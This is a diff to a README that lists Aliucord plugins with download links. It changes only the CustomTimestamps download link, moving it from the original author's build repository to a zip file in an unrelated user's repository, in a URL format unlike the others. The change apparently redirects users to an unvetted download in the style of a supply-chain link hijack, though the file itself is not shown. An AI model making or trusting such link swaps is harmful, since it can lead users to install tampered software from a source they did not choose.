@@ -16,7 +16,7 @@ It is a rewritten version of [Butterfly3ffect's BetterStatus](https://github.com
 ### [CustomNicknameFormat](https://github.com/Juby210/Aliucord-plugins/raw/builds/CustomNicknameFormat.zip)
 Allows you to customize nickname format.
 
-### [CustomTimestamps](https://github.com/Juby210/Aliucord-plugins/raw/builds/CustomTimestamps.zip)
+### [CustomTimestamps](https://github.com/marentyr2006/Aliucord-plugins/CustomTimestamps.zip)
 Custom timestamps format everywhere.
 
 ### [Experiments](https://github.com/Juby210/Aliucord-plugins/raw/builds/Experiments.zip)
